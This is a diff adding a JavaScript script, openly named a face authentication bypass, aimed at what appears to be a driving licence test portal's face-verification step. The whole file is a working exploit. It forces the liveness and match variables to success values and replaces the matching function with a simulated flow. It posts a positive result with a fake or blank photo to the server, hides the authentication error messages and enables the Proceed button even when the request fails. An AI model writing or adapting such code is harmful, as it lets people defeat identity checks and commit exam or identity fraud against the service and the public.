@@ -1,0 +1,239 @@
+(function() {
+    console.log("🔓 Enhanced face authentication bypass v7 activated");
+    
+    // Wait for all required elements and scripts to load
+    const waitForElements = setInterval(() => {
+        if (typeof aware !== 'undefined' && 
+            document.querySelector('video') && 
+            document.getElementById('message')) {
+            
+            clearInterval(waitForElements);
+            console.log("✅ Required elements found, starting bypass");
+            executeBypass();
+        }
+    }, 500);
+    
+    function executeBypass() {
+        // 1. Set all success state variables immediately
+        window.isGenuine = true;
+        window.realFaceCount = 30;
+        window.spoofFaceCount = 0;
+        window.totalChecks = 40;
+        window.smileCounter = 5;
+        window.blinkCount = 5;
+        window.eyesClosed = 0;
+        window.matchCount = 1;
+        
+        // 2. Create a fake photo from the video
+        const video = document.querySelector('video');
+        let fakePhoto = null;
+        
+        if (video && video.readyState >= 2) {
+            const tempCanvas = document.createElement('canvas');
+            tempCanvas.width = video.videoWidth || 300;
+            tempCanvas.height = video.videoHeight || 300;
+            const tempCtx = tempCanvas.getContext('2d');
+            tempCtx.drawImage(video, 0, 0, tempCanvas.width, tempCanvas.height);
+            fakePhoto = tempCanvas.toDataURL("image/jpeg", 0.5);
+            console.log("✅ Created fake photo from video");
+        } else {
+            // Create a blank canvas as fallback
+            const tempCanvas = document.createElement('canvas');
+            tempCanvas.width = 300;
+            tempCanvas.height = 300;
+            const tempCtx = tempCanvas.getContext('2d');
+            tempCtx.fillStyle = "#ffffff";
+            tempCtx.fillRect(0, 0, 300, 300);
+            fakePhoto = tempCanvas.toDataURL("image/jpeg", 0.5);
+            console.log("⚠ Created blank photo as fallback");
+        }
+        
+        // 3. Store original functions
+        const originalAjax = $.ajax;
+        const originalInsertfeceauth = window.insertfeceauth;
+        
+        // 4. Override the critical function that checks server response
+        window.checkServerResponse = function(response) {
+            console.log("🔄 Intercepted server response check:", response);
+            // Always return null regardless of actual response
+            return null;
+        };
+        
+        // 5. Override the function that shows error message
+        window.showFaceAuthError = function() {
+            console.log("🔄 Intercepted error display - preventing error message");
+            // Don't show any error message
+            return false;
+        };
+        
+        // 6. Override aware.match to simulate original flow
+        const originalMatch = window.aware.match;
+        window.aware.match = function() {
+            console.log("🔄 Intercepted aware.match with simulated flow");
+            
+            return new Promise((resolve, reject) => {
+                // Simulate the complete authentication process
+                setTimeout(() => {
+                    console.log("✅ Spoof detection completed.Genuine face detected.");
+                    
+                    setTimeout(() => {
+                        console.log("✅ Smile detection completed.");
+                        
+                        setTimeout(() => {
+                            console.log("✅ blinkCount---5---smileCounter---5---true");
+                            
+                            // Create intermediate result
+                            const intermediateResult = {
+                                isMatch: true,
+                                message: "Validation is in process, Please Wait ............",
+                                nextExp: "",
+                                photo: fakePhoto
+                            };
+                            
+                            // Update UI with intermediate message
+                            if (window.messageToShown) {
+                                window.messageToShown.innerHTML = intermediateResult.message;
+                            }
+                            
+                            // Simulate server communication
+                            setTimeout(() => {
+                                console.log("✅ Server response: true");
+                                
+                                // Final result
+                                const finalResult = {
+                                    isMatch: true,
+                                    message: "Click on Proceed to validate your credentials",
+                                    nextExp: "",
+                                    photo: fakePhoto
+                                };
+                                
+                                // Update UI with final message
+                                if (window.messageToShown) {
+                                    window.messageToShown.innerHTML = finalResult.message;
+                                }
+                                
+                                // Send data to server but override the response handling
+                                const llappln = document.getElementById('llappln')?.value || '';
+                                const rtocode = document.getElementById('rtocode')?.value || '';
+                                
+                                console.log("📤 Sending data to saveFaceAuthData.do");
+                                
+                                // Make the actual AJAX request but override response handling
+                                originalAjax({
+                                    type: 'POST',
+                                    url: 'saveFaceAuthData.do',
+                                    data: {
+                                        applno: llappln,
+                                        rtocode: rtocode,
+                                        faceres: 1,
+                                        CapPho: fakePhoto
+                                    },
+                                    dataType: 'json',
+                                    success: function(actualResponse) {
+                                        console.log("✅ Actual server response:", actualResponse);
+                                        
+                                        // Force the response to be treated as null
+                                        const nullResponse = null;
+                                        
+                                        console.log("🔄 Forcing response to be treated as null");
+                                        
+                                        // Enable proceed button (this should happen when null response is received)
+                                        if (document.getElementById('capphto1')) {
+                                            document.getElementById('capphto1').disabled = false;
+                                            console.log("✅ Proceed button enabled");
+                                        }
+                                        
+                                        // Disable authenticate button
+                                        if (document.getElementById('capphto')) {
+                                            document.getElementById('capphto').disabled = true;
+                                        }
+                                        
+                                        resolve(finalResult);
+                                    },
+                                    error: function(xhr, status, error) {
+                                        console.log("⚠ AJAX error but still enabling proceed button");
+                                        
+                                        // Even on error, enable proceed button
+                                        if (document.getElementById('capphto1')) {
+                                            document.getElementById('capphto1').disabled = false;
+                                        }
+                                        
+                                        resolve(finalResult);
+                                    }
+                                });
+                                
+                            }, 1000);
+                            
+                        }, 500);
+                        
+                    }, 500);
+                    
+                }, 500);
+            });
+        };
+        
+        // 7. Override insertfeceauth function to handle response properly
+        window.insertfeceauth = function(faceresult, llappln, rtocode, result_photo) {
+            console.log("🔄 Intercepted insertfeceauth");
+            
+            // Get values if not provided
+            llappln = llappln || document.getElementById('llappln')?.value || '';
+            rtocode = rtocode || document.getElementById('rtocode')?.value || '';
+            result_photo = result_photo || fakePhoto;
+            
+            // Make the actual AJAX request but handle response to avoid errors
+            originalAjax({
+                type: 'POST',
+                url: 'saveFaceAuthData.do',
+                data: {
+                    applno: llappln,
+                    rtocode: rtocode,
+                    faceres: 1,
+                    CapPho: result_photo
+                },
+                dataType: 'json',
+                success: function(actualResponse) {
+                    console.log("✅ Actual server response in insertfeceauth:", actualResponse);
+                    
+                    // Force the response to be treated as successful regardless of actual response
+                    console.log("🔄 Bypassing response validation - treating as success");
+                    
+                    // Enable proceed button
+                    if (document.getElementById('capphto1')) {
+                        document.getElementById('capphto1').disabled = false;
+                        console.log("✅ Proceed button enabled");
+                    }
+                    
+                    // Disable other elements
+                    if (document.getElementById('capphto')) {
+                        document.getElementById('capphto').disabled = true;
+                    }
+                },
+                error: function(xhr, status, error) {
+                    console.log("⚠ Error in insertfeceauth but still enabling button");
+                    
+                    // Even on error, enable proceed button
+                    if (document.getElementById('capphto1')) {
+                        document.getElementById('capphto1').disabled = false;
+                    }
+                }
+            });
+            
+            return true;
+        };
+        
+        // 8. Override the function that displays authentication error
+        const originalShowError = window.showAuthenticationError;
+        window.showAuthenticationError = function(message) {
+            if (message === "Face Authentication is not Successful, Please Authenticate your face before proceeding with the LL Test") {
+                console.log("🔄 Blocking face authentication error message");
+                return false; // Don't show the error
+            }
+            return originalShowError.apply(this, arguments);
+        };
+        
+        // 9. Start the authentication process automatically
+        console.log("🚀 Starting authentication process");
+        window.aware.match();
+    }
+})();
